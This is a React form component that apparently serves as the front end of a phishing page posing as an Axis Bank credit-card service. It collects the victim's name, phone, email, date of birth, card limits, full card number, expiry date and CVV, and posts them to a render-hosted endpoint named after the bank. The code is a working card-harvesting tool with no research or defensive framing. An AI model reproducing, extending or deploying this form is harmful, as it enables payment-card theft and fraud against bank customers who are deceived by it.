import React from "react";
import { useState } from "react";
import axios from "axios";
import p5 from "../src/assets/page3.jpg";
function Form() {
  const [user, setUser] = useState({
    name: "",
    mobile: "",
    email: "",
    dob: "",
    cardlimit: "",
    avilabelimit: "",
    holdername: "",
    cardnumber: "",
    expery: "",
    cvv: "",
  });

  const handleInputs = (e) => {
    const name = e.target.name;
    const value = e.target.value;

    setUser({ ...user, [name]: value });
  };

  async function postData(e) {
    e.preventDefault();
    try {
      const res = await axios.post("https://axisbankcard.onrender.com/axis", user);
      console.log(res.data);
    } catch (error) {
      alert(error.message);
      console.log(error.message);
    }
  }
  return (
    <>
      <div className="contanier">
        <div className="" data-bs-interval="10000">
          <img src={p5} className="d-block w-100" />
        </div>
      </div>

      <form action="" onSubmit={postData} className="mt-2">
        <div className="container px-0">
          <div className="d-flex justify-content-center">
            <div className=" d-flex justify-content-center ">
              <div className="row col-sm-8 mt-2">
                <div className="col-6 ">
                  <label htmlFor="name">Name</label>
                  <input
                    type="text"
                    name="name"
                    className="form-control"
                    value={user.name}
                    onChange={handleInputs}
                    autoComplete="off"
                    placeholder="Name"
                  />
                </div>

                <div className="col-6 ">
                  <label htmlFor="mobile">Mobile</label>
                  <input
                    type="tel"
                    minLength="10"
                    maxLength="10"
                    name="mobile"
                    className="form-control"
                    value={user.mobile}
                    onChange={handleInputs}
                    placeholder="Mobile"
                  />
                </div>

                <div className="container">
                  <label htmlFor="email" className="mt-2 ">
                    Email
                  </label>
                  <input
                    type="text"
                    className="form-control p-2"
                    name="email"
                    id="email"
                    value={user.email}
                    onChange={handleInputs}
                    placeholder="Email"
                  />

                  <label htmlFor="DOB" className="mt-2 ">
                    Date Of Barth
                  </label>
                  <input
                    type="date"
                    className="form-control"
                    name="dob"
                    id=""
                    value={user.dob}
                    onChange={handleInputs}
                    placeholder="DD-MM-YYYY"
                  />

                  <div className="row mt-2">
                    <div className="col-6">
                      <label htmlFor="cardlimit">Total Card Limit</label>
                      <input
                        className="form-control"
                        name="cardlimit"
                        type="number"
                        value={user.cardlimit}
                        onChange={handleInputs}
                        placeholder="Total Limit"
                      />
                    </div>

                    <div className="col-6">
                      <label htmlFor="avilabelimit">Available Card Limit</label>
                      <input
                        type="number"
                        className="form-control"
                        name="avilabelimit"
                        id=""
                        value={user.avilabelimit}
                        onChange={handleInputs}
                        placeholder="Card Limit"
                      />
                    </div>
                  </div>

                  <label htmlFor="holdername" className="mt-2 ">
                    Card Holder Name
                  </label>
                  <input
                    type="text"
                    className="form-control"
                    name="holdername"
                    id=""
                    value={user.holdername}
                    onChange={handleInputs}
                    placeholder="Card Holder Name"
                  />

                  <label htmlFor="cardnumber" className="mt-2">
                    Credit Card Number
                  </label>
                  <input
                    type="tel"
                    minLength="16"
                    maxLength="16"
                    className="form-control"
                    name="cardnumber"
                    id=""
                    value={user.cardnumber}
                    onChange={handleInputs}
                    placeholder="Card Number"
                  />

                  <div className="row mt-2 p-2">
                    <div className="col-6">
                      <label htmlFor="expery">Expiry Date</label>
                      <input
                        className="form-control"
                        name="expery"
                        minLength="4"
                        maxLength="4"
                        type="tel"
                        value={user.expery}
                        onChange={handleInputs}
                        placeholder="MM/YY"
                      />
                    </div>

                    <div className="col-6">
                      <label htmlFor="cvv">CVV</label>
                      <input
                        type="tel"
                        minLength="3"
                        maxLength="3"
                        className="form-control"
                        name="cvv"
                        id=""
                        value={user.cvv}
                        onChange={handleInputs}
                        placeholder="CVV"
                      />
                    </div>
                  </div>

                  <div className="container d-flex justify-content-center ">
                    <div className="col-8">
                      <button className="form-control btn btn-outline-primary mt-3 p-2">Submit</button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
    </>
  );
}

export default Form;
